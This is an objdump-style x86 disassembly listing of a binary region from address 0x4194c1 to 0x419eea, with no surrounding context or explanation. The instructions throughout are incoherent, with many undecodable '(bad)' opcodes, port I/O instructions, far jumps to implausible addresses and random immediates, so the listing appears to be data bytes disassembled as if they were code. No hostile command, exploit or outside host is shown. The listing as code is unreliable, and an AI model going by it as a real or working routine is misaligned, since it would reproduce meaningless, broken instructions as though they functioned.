  4194c1:	ja     0x4194dd
  4194c3:	and    esp,DWORD PTR [ecx-0x36f2c418]
  4194c9:	xor    dh,BYTE PTR [edi-0x10e7c21a]
  4194cf:	daa    
  4194d0:	lea    edi,[edx+0x49a888ff]
  4194d6:	jns    0x41949a
  4194d8:	rcr    BYTE PTR [esi-0x48],0xc
  4194dc:	push   esp
  4194dd:	xor    edx,eax
  4194df:	sbb    DWORD PTR [ebx],ebp
  4194e1:	inc    ebp
  4194e2:	xor    ecx,DWORD PTR [ebx+0x36]
  4194e5:	dec    edx
  4194e6:	xchg   ebx,eax
  4194e7:	xchg   ecx,eax
  4194e8:	fwait
  4194e9:	jo     0x419531
  4194eb:	scas   al,BYTE PTR es:[edi]
  4194ec:	mov    esp,0x954332b9
  4194f1:	lahf   
  4194f2:	inc    edx
  4194f3:	lods   al,BYTE PTR ds:[esi]
  4194f4:	(bad)  
  4194f5:	in     eax,0xff
  4194f7:	and    edx,ecx
  4194f9:	out    0xab,al
  4194fb:	dec    eax
  4194fc:	jmp    0x8722524e
  419501:	cmp    BYTE PTR [eax*4+0x1aacd419],cl
  419508:	xor    esp,DWORD PTR [eax-0x14658671]
  41950e:	retf   
  41950f:	es sbb bl,dh
  419512:	add    esi,esp
  419514:	mov    edx,0x2a02b311
  419519:	mov    BYTE PTR [edx+0x2f146269],bh
  41951f:	pop    esi
  419520:	fcmovnbe st,st(4)
  419522:	add    eax,0x2f404441
  419527:	call   0xac8:0xe1ff428b
  41952e:	fnsave [edi]
  419530:	out    0xf3,al
  419532:	xlat   BYTE PTR ds:[ebx]
  419533:	lahf   
  419534:	and    eax,0x0
	...
  419595:	add    BYTE PTR [edi-0x9d722c],ch
  41959b:	jnp    0x41958c
  41959d:	fnsave [ebx-0xf]
  4195a0:	xchg   esi,eax
  4195a1:	not    BYTE PTR [ecx+edi*4]
  4195a4:	jbe    0x4195df
  4195a6:	or     DWORD PTR [edx],0x1
  4195a9:	add    BYTE PTR [edi],al
  4195ab:	add    DWORD PTR [eax],eax
  4195ad:	add    BYTE PTR [edx-0x68],dl
  4195b0:	push   cs
  4195b1:	mov    ecx,0xa7ea5938
  4195b6:	bound  ebp,QWORD PTR [ecx]
  4195b8:	add    DWORD PTR [ebp-0x4f],edi
  4195bb:	add    cl,BYTE PTR [edi+eax*8]
  4195be:	mov    edx,0x71753382
  4195c3:	xchg   esi,eax
  4195c4:	aad    0x26
  4195c6:	inc    eax
  4195c7:	mov    cl,0xb0
  4195c9:	adc    dl,dl
  4195cb:	jle    0x419586
  4195cd:	call   0x5d752827
  4195d2:	imul   eax,edi,0x67f21a85
  4195d8:	or     DWORD PTR [ecx-0x27e071b8],ecx
  4195de:	(bad)  
  4195df:	pushf  
  4195e0:	mov    ds:0x576196bf,al
  4195e5:	out    0x2c,al
  4195e7:	sbb    al,al
  4195e9:	stos   BYTE PTR es:[edi],al
  4195ea:	mov    ecx,0x74faa03a
  4195ef:	or     DWORD PTR [edx-0x5294df81],edx
  4195f5:	leave  
  4195f6:	sbb    eax,0x8788dd94
  4195fb:	jg     0x4195f9
  4195fd:	jg     0x419646
  4195ff:	and    bl,BYTE PTR [edi+eiz*8]
  419602:	int3   
  419603:	cmp    al,0x52
  419605:	mov    ds:0xbc8679fb,al
  41960a:	(bad)  
  41960c:	pushf  
  41960d:	cdq    
  41960e:	add    al,0x5d
  419610:	jns    0x419682
  419612:	(bad)  
  419613:	ins    BYTE PTR es:[edi],dx
  419614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419615:	(bad)  
  419616:	popa   
  419617:	cmp    BYTE PTR [edi+0x3a],cl
  41961a:	dec    ebp
  41961b:	aas    
  41961c:	jl     0x4195c9
  41961e:	das    
  41961f:	xchg   edi,eax
  419620:	and    al,0x55
  419622:	(bad)  
  419623:	out    0x35,eax
  419625:	pop    ss
  419626:	nop
  419627:	push   eax
  419628:	mov    ds:0x351893db,eax
  41962d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41962e:	ficom  DWORD PTR [ebx+edx*2+0x53]
  419632:	(bad)
  419635:	ror    BYTE PTR [ecx],0x62
  419638:	xor    BYTE PTR [esi+0x64],ch
  41963b:	cmp    ebp,eax
  41963d:	fisttp DWORD PTR [ecx+0x72]
  419640:	fdivr  st,st(0)
  419642:	loopne 0x41967c
  419644:	mov    esp,0xe547fa9b
  419649:	xchg   DWORD PTR [eax+edx*1],ecx
  41964c:	push   ds
  41964d:	and    DWORD PTR [esi+0x32d47953],0xffffffe8
  419654:	mov    ebx,0x3a0bbd65
  419659:	fldcw  WORD PTR [ebx+0x16]
  41965c:	call   0xad7c0ea5
  419661:	int    0x7c
  419663:	ja     0x419644
  419665:	cwde   
  419666:	retf   
  419667:	daa    
  419668:	sub    ch,al
  41966a:	test   edx,esp
  41966c:	push   ds
  41966d:	out    dx,eax
  41966e:	imul   esp,DWORD PTR [edx],0xffffffa5
  419671:	jb     0x419601
  419673:	icebp  
  419674:	fdiv   st,st(2)
  419676:	push   esi
  419677:	jge    0x4195f9
  419679:	in     eax,dx
  41967a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41967b:	das    
  41967c:	sbb    DWORD PTR [edx],ebp
  41967e:	mov    bl,BYTE PTR ds:0x33b914f2
  419684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419685:	imul   edi,DWORD PTR [edi-0x295d284d],0x40
  41968c:	jne    0x419692
  41968e:	jae    0x41962b
  419690:	in     eax,0xf3
  419692:	aaa    
  419693:	imul   ebp,DWORD PTR [eax-0x52],0xcf003a2
  41969a:	aam    0x3
  41969c:	cmp    BYTE PTR [ebx+0x69],bh
  41969f:	mov    edx,es
  4196a1:	add    cl,bl
  4196a3:	scas   al,BYTE PTR es:[edi]
  4196a4:	scas   al,BYTE PTR es:[edi]
  4196a5:	sub    eax,0xaafe60a9
  4196aa:	or     al,0xa4
  4196ac:	aam    0x6a
  4196ae:	push   ss
  4196af:	jns    0x4196e8
  4196b1:	mov    ah,0xfe
  4196b3:	in     eax,dx
  4196b4:	add    DWORD PTR [eax],0x0
	...
  419713:	add    BYTE PTR [eax],al
  419715:	add    BYTE PTR [ebx-0x29a8ec1],dh
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	mov    bh,0xff
  41971e:	inc    ebp
  41971f:	loop   0x419766
  419721:	dec    esp
  419722:	aam    0xdf
  419724:	and    DWORD PTR [ebp+0x10b8a],0x7
  41972b:	add    DWORD PTR [eax],eax
  41972d:	add    BYTE PTR [edx-0x22d3772d],cl
  419733:	pop    es
  419734:	xlat   BYTE PTR ds:[ebx]
  419735:	cmp    eax,ebx
  419737:	adc    bh,dl
  419739:	mov    ecx,0xd1701d8b
  41973e:	outs   dx,BYTE PTR ds:[esi]
  41973f:	iret   
  419740:	push   esi
  419741:	jno    0x419759
  419743:	in     eax,0xc7
  419745:	sbb    eax,0x4c58d7e1
  41974a:	(bad)  
  41974b:	fwait
  41974c:	enter  0xbc9b,0x4a
  419750:	loopne 0x419724
  419752:	fcomip st,st(1)
  419754:	cmp    al,0xe0
  419756:	cmp    al,0xc
  419758:	repz jns 0x4196fd
  41975b:	sbb    al,0xf
  41975d:	dec    ecx
  41975e:	push   eax
  41975f:	xor    ah,ah
  419761:	xchg   ebp,eax
  419762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419763:	xor    al,0x45
  419765:	mov    ds:0xff133c31,eax
  41976a:	ds pop esi
  41976c:	xor    DWORD PTR [ebp+0x5a948bc],0xffffffb7
  419773:	es int3 
  419775:	int    0xaa
  419777:	mov    al,ds:0xf9803918
  41977c:	gs inc eax
  41977e:	pop    esp
  41977f:	or     eax,eax
  419781:	repnz mov bl,0xfb
  419784:	imul   edx,DWORD PTR [esi+esi*4],0x1f
  419788:	ss icebp 
  41978a:	fistp  QWORD PTR [eax-0x4d]
  41978d:	pop    ss
  41978e:	sub    eax,0x6a6ebdbc
  419793:	mov    ch,0xe7
  419795:	pushf  
  419796:	into   
  419797:	inc    ecx
  419798:	sbb    DWORD PTR [ecx+0x5a],0x3bd3cb17
  41979f:	push   0xab18ccf9
  4197a4:	fxch   st(4)
  4197a6:	ret    0x9dd2
  4197a9:	mov    esp,DWORD PTR [edx+0x53bb6ec7]
  4197af:	push   edi
  4197b0:	out    0x82,al
  4197b2:	pushf  
  4197b3:	imul   dh
  4197b5:	mov    eax,ds:0x2e26f785
  4197ba:	lea    edi,[edi]
  4197bc:	xchg   esp,eax
  4197bd:	sub    cl,BYTE PTR [eax+0x57]
  4197c0:	inc    edx
  4197c1:	or     eax,0x7e97275c
  4197c6:	mov    BYTE PTR [ecx],dh
  4197c8:	mov    eax,ds:0x1a9912d
  4197cd:	jns    0x4197c3
  4197cf:	jp     0x419812
  4197d1:	fstp   st(1)
  4197d3:	loop   0x4197d7
  4197d5:	mov    ebx,0xf22cd07d
  4197da:	cli    
  4197db:	shr    BYTE PTR [ebx+0x76],0xa1
  4197df:	out    dx,eax
  4197e0:	pop    esp
  4197e1:	xchg   ecx,eax
  4197e2:	jmp    0x39bde0a4
  4197e7:	mov    ds:0x27a54459,eax
  4197ec:	jle    0x4197fd
  4197ee:	(bad)  
  4197ef:	frstor [eax]
  4197f1:	test   al,0x5c
  4197f3:	nop
  4197f4:	outs   dx,DWORD PTR ds:[esi]
  4197f5:	fld    DWORD PTR [eax]
  4197f7:	rol    ch,1
  4197f9:	sub    DWORD PTR [edi],esi
  4197fb:	outs   dx,DWORD PTR ds:[esi]
  4197fc:	shl    DWORD PTR [ebp+0x77a52910],cl
  419802:	sbb    eax,0x6ceca476
  419807:	push   0x23
  419809:	dec    ebx
  41980a:	sbb    dh,BYTE PTR [edx-0x5b]
  41980d:	mov    bl,0x3
  41980f:	mov    cl,0x39
  419811:	mov    ds:0xb35822f2,eax
  419816:	jg     0x41981b
  419818:	ja     0x419851
  41981a:	fwait
  41981b:	and    edx,ebp
  41981d:	out    0x6f,eax
  41981f:	mov    DWORD PTR [esi],esp
  419821:	(bad)  
  419822:	lods   eax,DWORD PTR ds:[esi]
  419823:	push   ds
  419824:	mov    ecx,0x6e245b0e
  419829:	fwait
  41982a:	(bad)  
  41982b:	hlt    
  41982c:	mov    al,0x75
  41982e:	adc    eax,DWORD PTR [ebp-0x1d09eca1]
  419834:	inc    esi
	...
  419895:	add    BYTE PTR [edx-0x201eb8e7],al
  41989b:	jmp    DWORD PTR [esi-0x4a285f85]
  4198a1:	fidiv  DWORD PTR [edx-0x6b]
  4198a4:	fs hlt 
  4198a6:	xchg   ecx,eax
  4198a7:	or     al,0x1
  4198a9:	add    BYTE PTR [edi],al
  4198ab:	add    DWORD PTR [eax],eax
  4198ad:	add    BYTE PTR [esi],ah
  4198af:	retf   
  4198b0:	or     al,0x5d
  4198b2:	inc    esp
  4198b3:	test   eax,0x2f1414ff
  4198b8:	sub    eax,0x93bf336d
  4198bd:	mov    edx,0xfdfe29f
  4198c2:	shl    BYTE PTR [eax],cl
  4198c4:	lahf   
  4198c5:	cs xchg ebx,eax
  4198c7:	out    dx,al
  4198c8:	ror    DWORD PTR [ebp-0x10],0xf9
  4198cc:	in     eax,0x55
  4198ce:	(bad)  
  4198cf:	shl    BYTE PTR [eax-0x19],1
  4198d2:	sbb    DWORD PTR [eax-0x3ef8c83e],edx
  4198d8:	push   0x4f
  4198da:	dec    edi
  4198db:	jmp    0x41991f
  4198dd:	pop    ebx
  4198de:	shr    DWORD PTR [eax],cl
  4198e0:	fwait
  4198e1:	xchg   ch,al
  4198e3:	int    0x90
  4198e5:	iret   
  4198e6:	jl     0x419967
  4198e8:	mov    edi,eax
  4198ea:	mov    eax,ds:0x580d71b7
  4198ef:	aaa    
  4198f0:	dec    DWORD PTR [edx-0x2b]
  4198f3:	dec    eax
  4198f4:	dec    edx
  4198f5:	mov    eax,0x8872d152
  4198fa:	mov    ebx,0x2c44b6ed
  4198ff:	mov    al,ds:0xe3d01a45
  419904:	sub    esi,DWORD PTR [eax]
  419906:	or     al,0xa8
  419908:	or     DWORD PTR [ecx],0xfffffffd
  41990b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41990c:	pusha  
  41990d:	xor    eax,0xff9c7b5d
  419912:	sub    ebx,DWORD PTR [edx]
  419914:	bound  ebx,QWORD PTR [eax]
  419916:	and    dl,ah
  419918:	dec    esp
  419919:	mov    cl,0x13
  41991b:	jno    0x41996a
  41991d:	push   es
  41991e:	fwait
  41991f:	push   0x1172554c
  419924:	sub    eax,0xb68ebf34
  419929:	lods   eax,DWORD PTR ds:[esi]
  41992a:	sbb    cx,WORD PTR [eax-0x21d8e7c]
  419931:	push   ss
  419932:	repnz or al,0x32
  419935:	or     eax,0xaf80bbbc
  41993a:	iret   
  41993b:	in     al,0x62
  41993d:	sub    al,0x51
  41993f:	dec    ebp
  419940:	xchg   edi,eax
  419941:	retf   
  419942:	sti    
  419943:	arpl   WORD PTR [edx+0x43bb8d70],bp
  419949:	dec    ebp
  41994a:	jae    0x419901
  41994c:	fcomp  DWORD PTR [esi]
  41994e:	(bad)  
  41994f:	gs fadd st,st(2)
  419952:	jno    0x4199b7
  419954:	xor    DWORD PTR [edx+ecx*1-0x74],esi
  419958:	loope  0x41991d
  41995a:	nop
  41995b:	adc    esi,eax
  41995d:	and    al,0xda
  41995f:	lods   al,BYTE PTR ds:[esi]
  419960:	outs   dx,DWORD PTR ds:[esi]
  419961:	fwait
  419962:	xchg   ecx,eax
  419963:	ret    0xc906
  419966:	adc    eax,0xd0c36b5
  41996b:	stos   BYTE PTR es:[edi],al
  41996c:	mov    edi,0xa2483d78
  419971:	bound  ebx,QWORD PTR [edx+0x5d]
  419974:	and    eax,edi
  419976:	and    ecx,DWORD PTR [edx-0x5d]
  419979:	jno    0x4199ed
  41997b:	push   eax
  41997c:	xchg   BYTE PTR [ecx+0x42],ch
  41997f:	mov    dl,0x4e
  419981:	shl    DWORD PTR [edx],1
  419983:	leave  
  419984:	mov    al,0xba
  419986:	adc    edx,DWORD PTR [eax+0x5808e0f6]
  41998c:	je     0x41998f
  41998e:	push   0x3f
  419990:	or     al,0xc1
  419992:	out    dx,al
  419993:	fild   WORD PTR [edi]
  419995:	retf   0x6211
  419998:	jb     0x419a07
  41999a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41999b:	shl    BYTE PTR [eax+edi*8+0x5],1
  41999f:	xor    BYTE PTR ds:0x4e338899,ah
  4199a5:	(bad)  
  4199a6:	loopne 0x419a0a
  4199a8:	cmp    al,0x57
  4199aa:	stos   DWORD PTR es:[edi],eax
  4199ab:	hlt    
  4199ac:	repz adc BYTE PTR [ecx-0x13],bl
  4199b0:	daa    
  4199b1:	icebp  
  4199b2:	in     al,dx
  4199b3:	push   ebp
  4199b4:	pop    es
	...
  419a15:	add    BYTE PTR [ebx],dh
  419a17:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a1d:	neg    DWORD PTR [ecx+0x16]
  419a20:	mov    eax,ds:0x27428009
  419a25:	out    dx,eax
  419a26:	cwde   
  419a27:	or     eax,0x1070001
  419a2c:	add    BYTE PTR [eax],al
  419a2e:	sub    BYTE PTR [edx-0x3a55a468],bl
  419a34:	xor    eax,0x8e88c9fd
  419a39:	dec    eax
  419a3a:	or     dh,bh
  419a3c:	in     al,0x6e
  419a3e:	ret    
  419a3f:	std    
  419a40:	pop    ebx
  419a41:	bound  esi,QWORD PTR [esi-0x60]
  419a44:	xchg   DWORD PTR [esi+edx*4],edx
  419a47:	sbb    DWORD PTR [ecx],ebx
  419a49:	loope  0x419aa9
  419a4b:	adc    DWORD PTR [ecx+0x3c],esp
  419a4e:	xchg   ecx,eax
  419a4f:	shl    DWORD PTR [edx-0x2c2f860d],1
  419a55:	ss push ebp
  419a57:	adc    esi,DWORD PTR [esi]
  419a59:	repz (bad) 
  419a5b:	and    BYTE PTR [edi],ch
  419a5d:	daa    
  419a5e:	inc    edx
  419a5f:	test   edx,0xd507037b
  419a65:	idiv   BYTE PTR [eax-0x1114a63f]
  419a6b:	jl     0x4199fd
  419a6d:	in     eax,dx
  419a6e:	ja     0x419a88
  419a70:	aad    0xcf
  419a72:	pop    eax
  419a73:	mov    ebx,0xb4501b39
  419a78:	or     al,0x89
  419a7a:	jmp    0x419a17
  419a7c:	sub    ebx,edx
  419a7e:	mov    bh,0x73
  419a80:	scas   al,BYTE PTR es:[edi]
  419a81:	adc    BYTE PTR [edx],bl
  419a83:	sbb    al,0x6c
  419a85:	ds mov eax,0x9a490ffa
  419a8b:	sar    DWORD PTR [esi],1
  419a8d:	inc    ebx
  419a8e:	aam    0x68
  419a90:	not    eax
  419a92:	xlat   BYTE PTR ds:[ebx]
  419a93:	sbb    eax,0xd4b4f79a
  419a98:	mov    al,ds:0xc2f86a67
  419a9d:	cld    
  419a9e:	and    eax,0xb4872549
  419aa3:	ret    0x36bc
  419aa6:	sbb    al,0x99
  419aa8:	(bad)  
  419aa9:	jbe    0x419b1a
  419aab:	rcl    BYTE PTR [ecx],0xbb
  419aae:	and    cl,0x5d
  419ab1:	dec    eax
  419ab2:	loop   0x419a88
  419ab4:	out    0x15,eax
  419ab6:	dec    edi
  419ab7:	cdq    
  419ab8:	pop    ecx
  419ab9:	cmp    BYTE PTR [edx+0x1a],ah
  419abc:	call   0xc9295e7e
  419ac1:	xchg   ebp,eax
  419ac2:	rep stos BYTE PTR es:[edi],al
  419ac4:	xchg   esp,eax
  419ac5:	inc    esi
  419ac6:	inc    ecx
  419ac7:	sub    BYTE PTR [esi],dl
  419ac9:	cmp    eax,0x676b174b
  419ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419acf:	ja     0x419aec
  419ad1:	pop    ds
  419ad2:	jmp    0x419a72
  419ad4:	fstp   DWORD PTR [edx+0x5b07e273]
  419ada:	xchg   ebx,eax
  419adb:	scas   al,BYTE PTR es:[edi]
  419adc:	add    DWORD PTR [esi+0x28],ebp
  419adf:	test   DWORD PTR [eax],0x5990e85a
  419ae5:	cs jl  0x419ab1
  419ae8:	js     0x419b4a
  419aea:	cmp    edx,DWORD PTR [eax+0x38]
  419aed:	jnp    0x419abb
  419aef:	jb     0x419b6b
  419af1:	rcl    bh,cl
  419af3:	(bad)  
  419af4:	out    0x67,al
  419af6:	jp     0x419b37
  419af8:	div    DWORD PTR [eax+0x29797475]
  419afe:	cmp    al,0x94
  419b00:	xchg   edi,eax
  419b01:	xor    al,0x28
  419b03:	pop    eax
  419b04:	je     0x419b22
  419b06:	int    0xd5
  419b08:	lods   al,BYTE PTR ds:[esi]
  419b09:	pop    ebx
  419b0a:	inc    esp
  419b0b:	mov    esp,0x2262d6
  419b10:	bnd jmp 0x9a73d340
  419b16:	sbb    dh,BYTE PTR [esi+0x2a61d274]
  419b1c:	fucomi st,st(7)
  419b1e:	into   
  419b1f:	(bad)  
  419b20:	lods   eax,DWORD PTR ds:[esi]
  419b21:	mov    esi,0xbdc7cfaf
  419b26:	out    dx,al
  419b27:	je     0x419ba6
  419b29:	jmp    0x419ac3
  419b2b:	mov    ch,ah
  419b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b2e:	jge    0x419b86
  419b30:	repnz fwait
  419b32:	and    DWORD PTR [edi+0x1],ebx
	...
  419b95:	add    BYTE PTR [edx-0x3c],cl
  419b98:	cli    
  419b99:	inc    edi
  419b9a:	(bad)  
  419b9b:	jg     0x419b9c
  419b9d:	int    0xb7
  419b9f:	cs aam 0x47
  419ba2:	addr16 and bl,bl
  419ba5:	xlat   BYTE PTR ds:[ebx]
  419ba6:	lahf   
  419ba7:	push   cs
  419ba8:	add    DWORD PTR [eax],eax
  419baa:	pop    es
  419bab:	add    DWORD PTR [eax],eax
  419bad:	add    BYTE PTR [ebp+ebp*8-0x4991f236],ch
  419bb4:	mov    bl,0x6e
  419bb6:	push   edx
  419bb7:	jb     0x419bda
  419bb9:	fstp   TBYTE PTR [edx-0x12]
  419bbc:	adc    dl,bl
  419bbe:	dec    eax
  419bbf:	mov    dh,0x74
  419bc1:	repz iret 
  419bc3:	in     eax,dx
  419bc4:	loope  0x419b7f
  419bc6:	jp     0x419bcf
  419bc8:	xchg   esp,eax
  419bc9:	imul   bh
  419bcb:	loope  0x419bc7
  419bcd:	mov    al,0xe8
  419bcf:	hlt    
  419bd0:	and    ah,BYTE PTR [edi-0x2c]
  419bd3:	add    ebp,ecx
  419bd5:	dec    esp
  419bd6:	jle    0x419c3b
  419bd8:	ins    DWORD PTR es:[edi],dx
  419bd9:	inc    edi
  419bda:	rol    DWORD PTR ds:0x58600e16,1
  419be0:	mov    al,ds:0xf1e1f12d
  419be5:	pop    eax
  419be6:	les    esi,FWORD PTR [ebx+0x6da70ed7]
  419bec:	dec    eax
  419bed:	scas   eax,DWORD PTR es:[edi]
  419bee:	inc    edi
  419bef:	jecxz  0x419c66
  419bf1:	push   esi
  419bf2:	lahf   
  419bf3:	or     BYTE PTR [ecx-0x63],bh
  419bf6:	push   cs
  419bf7:	sub    al,0xf
  419bf9:	fucomi st,st(5)
  419bfb:	ss loopne 0x419bcb
  419bfe:	push   ebx
  419bff:	pop    es
  419c00:	fwait
  419c01:	sbb    eax,0xe53c2db1
  419c06:	stos   DWORD PTR es:[edi],eax
  419c07:	mov    BYTE PTR [ebp+0x32366bcb],al
  419c0d:	sar    bh,cl
  419c0f:	iret   
  419c10:	idiv   DWORD PTR [ecx]
  419c12:	mov    eax,0xeff4bed
  419c17:	shl    DWORD PTR ss:[edi],1
  419c1a:	rcl    cl,cl
  419c1c:	dec    ebp
  419c1d:	push   eax
  419c1e:	mov    ds:0xe1f01a9,eax
  419c23:	fst    QWORD PTR [edx-0x16150548]
  419c29:	pop    ebx
  419c2a:	scas   al,BYTE PTR es:[edi]
  419c2b:	push   ss
  419c2c:	xor    al,0x9f
  419c2e:	out    dx,eax
  419c2f:	push   0x42eead6
  419c34:	sbb    BYTE PTR [edi+0x36],ch
  419c37:	sub    BYTE PTR [ebx],cl
  419c39:	inc    esp
  419c3a:	jo     0x419bfa
  419c3c:	div    DWORD PTR [esp+edi*1-0x4c]
  419c40:	dec    esp
  419c41:	ja     0x419c70
  419c43:	xor    dh,0xa
  419c46:	sti    
  419c47:	lds    edi,FWORD PTR [eax]
  419c49:	clc    
  419c4a:	push   ebx
  419c4b:	and    dl,dh
  419c4d:	std    
  419c4e:	sub    DWORD PTR [edi-0x172578d3],edx
  419c54:	stos   BYTE PTR es:[edi],al
  419c55:	xchg   BYTE PTR [ebx+0x7d],al
  419c58:	sahf   
  419c59:	xchg   ch,ch
  419c5b:	gs loop 0x419c71
  419c5e:	xlat   BYTE PTR ds:[ebx]
  419c5f:	inc    edi
  419c60:	in     al,0xeb
  419c62:	xlat   BYTE PTR ds:[ebx]
  419c63:	and    esi,0x5b015b56
  419c69:	jne    0x419cd1
  419c6b:	add    dh,dl
  419c6d:	(bad)  
  419c6e:	les    edi,FWORD PTR [eax]
  419c70:	or     al,0xad
  419c72:	out    0x93,al
  419c74:	cmp    al,0xf9
  419c76:	in     eax,0x92
  419c78:	into   
  419c79:	(bad)  
  419c7a:	cmp    esp,eax
  419c7c:	idiv   BYTE PTR [ebp-0x5d3367a3]
  419c82:	jg     0x419c3c
  419c84:	into   
  419c85:	cld    
  419c86:	xor    BYTE PTR [esi+0x16],dh
  419c89:	push   eax
  419c8a:	inc    edx
  419c8b:	aas    
  419c8c:	out    dx,eax
  419c8d:	xchg   ebx,eax
  419c8e:	mov    dl,0xbd
  419c90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c91:	push   ebp
  419c92:	cli    
  419c93:	mov    bh,0x5e
  419c95:	xor    al,0x54
  419c97:	push   es
  419c98:	nop
  419c99:	dec    esp
  419c9a:	test   al,0x6f
  419c9c:	push   ebx
  419c9d:	ins    BYTE PTR es:[edi],dx
  419c9e:	cmp    BYTE PTR [edi+0x6e16112c],ch
  419ca4:	mov    BYTE PTR [eax+0x7b],ch
  419ca7:	jne    0x419d24
  419ca9:	push   ss
  419caa:	aaa    
  419cab:	mov    ecx,0xa3509116
  419cb0:	cli    
  419cb1:	xor    esp,ebx
  419cb3:	test   al,0x52
	...
  419d15:	add    al,dh
  419d17:	xchg   edi,eax
  419d18:	std    
  419d19:	cmp    al,0xff
  419d1b:	jle    0x419d0e
  419d1d:	fistp  WORD PTR [eax]
  419d1f:	push   0xf0ff9c45
  419d24:	sbb    DWORD PTR [edi+0x10fa6],eax
  419d2a:	pop    es
  419d2b:	add    DWORD PTR [eax],eax
  419d2d:	add    BYTE PTR [ebp+eiz*4-0x276f3972],cl
  419d34:	mov    edi,ss
  419d36:	mov    edi,0x6fb4578c
  419d3b:	aam    0xcc
  419d3d:	cmp    bh,BYTE PTR [esi+0x72163d2e]
  419d43:	sub    eax,0xb21a3e68
  419d48:	in     eax,0xce
  419d4a:	pop    ds
  419d4b:	cld    
  419d4c:	inc    ecx
  419d4d:	cmp    al,0x6
  419d4f:	adc    ch,BYTE PTR [eax+0x3b13d33b]
  419d55:	push   edx
  419d56:	adc    al,BYTE PTR [edi]
  419d58:	jg     0x419d52
  419d5a:	cmc    
  419d5b:	push   ebp
  419d5c:	leave  
  419d5d:	fdivr  st,st(1)
  419d5f:	jecxz  0x419d1f
  419d61:	sub    ah,bh
  419d63:	cmp    ch,dl
  419d65:	dec    DWORD PTR [edx]
  419d67:	arpl   WORD PTR [ebx+0x456bf5fd],si
  419d6d:	int3   
  419d6e:	add    esp,esp
  419d70:	mov    ebx,0xa0191bf4
  419d75:	scas   eax,DWORD PTR es:[edi]
  419d76:	xchg   esp,eax
  419d77:	lahf   
  419d78:	push   eax
  419d79:	je     0x419df9
  419d7b:	cmp    cl,BYTE PTR [esi]
  419d7d:	pop    edx
  419d7e:	and    al,BYTE PTR [ecx-0x3f4c8f17]
  419d84:	or     ebp,DWORD PTR [ebp+0x6fb61895]
  419d8a:	data16 cli 
  419d8c:	cs pushf 
  419d8e:	or     eax,0x6b953fb1
  419d93:	pop    ebx
  419d94:	push   ebx
  419d95:	push   ebp
  419d96:	test   eax,0x4c650421
  419d9b:	in     eax,0x7b
  419d9d:	mov    edi,0xd71e39d0
  419da2:	add    edi,DWORD PTR [ebx+esi*8]
  419da5:	out    dx,al
  419da6:	dec    edi
  419da7:	pop    DWORD PTR [ebx+0xf47212a]
  419dad:	mov    dl,0x8c
  419daf:	mov    ds:0x77561c72,eax
  419db4:	pusha  
  419db5:	or     DWORD PTR [eax-0x3f],esi
  419db8:	out    0x53,al
  419dba:	scas   eax,DWORD PTR es:[edi]
  419dbb:	jbe    0x419e36
  419dbd:	mov    dl,0x25
  419dbf:	test   DWORD PTR cs:[edx],ebp
  419dc2:	into   
  419dc3:	xor    edx,edi
  419dc5:	push   esp
  419dc6:	fistp  WORD PTR [edi]
  419dc8:	inc    edi
  419dc9:	(bad)  
  419dca:	pop    edi
  419dcb:	retf   0xaddc
  419dce:	ds gs adc eax,0x2cd814be
  419dd5:	retf   0x75a0
  419dd8:	test   al,ch
  419dda:	mov    ch,BYTE PTR [eax+esi*4-0x68]
  419dde:	pop    esi
  419ddf:	xor    DWORD PTR [eax],edi
  419de1:	mov    dl,0x9b
  419de3:	popf   
  419de4:	pop    eax
  419de5:	push   esp
  419de6:	mov    ecx,0x11981bbb
  419deb:	in     al,dx
  419dec:	gs dec eax
  419dee:	and    DWORD PTR [ebp-0x7aacdcd9],ecx
  419df4:	jbe    0x419e14
  419df6:	add    eax,0xfee84b0e
  419dfb:	cmp    DWORD PTR [edx+0x0],ebp
  419dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dff:	fdiv   DWORD PTR [eax-0x1dcb60d5]
  419e05:	daa    
  419e06:	jmp    0x2c53:0xdaab6819
  419e0d:	jmp    0x7105:0x857924e0
  419e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e15:	les    ecx,FWORD PTR [edi]
  419e17:	inc    edx
  419e18:	bound  edx,QWORD PTR [ebp+0x59]
  419e1b:	mov    ah,0xfc
  419e1d:	mov    al,ds:0x569ae56e
  419e22:	popa   
  419e23:	add    DWORD PTR [ecx-0x2e],ebp
  419e26:	mov    ecx,0x4e681e7f
  419e2b:	pop    ecx
  419e2c:	leave  
  419e2d:	xor    BYTE PTR [ecx-0x5e19c9a2],dl
  419e33:	popa   
  419e34:	hlt    
	...
  419e95:	add    BYTE PTR [edi+0x5fc517d8],al
  419e9b:	iret   
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	fimul  DWORD PTR [eax+0x7950c5a0]
  419ea3:	int    0xcc
  419ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ea6:	lods   eax,DWORD PTR ds:[esi]
  419ea7:	adc    BYTE PTR [ecx],al
  419ea9:	add    BYTE PTR [edi],al
  419eab:	add    DWORD PTR [eax],eax
  419ead:	add    BYTE PTR [ebx+edi*8+0x70acfe29],dh
  419eb4:	push   edx
  419eb5:	mov    DWORD PTR [ecx+0x4a],0x651297a6
  419ebc:	mov    ebp,ebp
  419ebe:	jmp    0xedde11aa
  419ec3:	arpl   WORD PTR [esi-0x12d39d63],di
  419ec9:	and    al,0x53
  419ecb:	xor    bl,BYTE PTR [ebp+edi*4+0x1dd2849a]
  419ed2:	loop   0x419e9f
  419ed4:	outs   dx,BYTE PTR ds:[esi]
  419ed5:	rcl    DWORD PTR [eax-0x4ebda29d],0x5f
  419edc:	daa    
  419edd:	mov    dl,0x1
  419edf:	jmp    0x419f3f
  419ee1:	and    DWORD PTR [ecx+0x6d],esp
  419ee4:	add    ecx,DWORD PTR [eax-0x26cdbbdc]
  419eea:	mov    bh,0xff
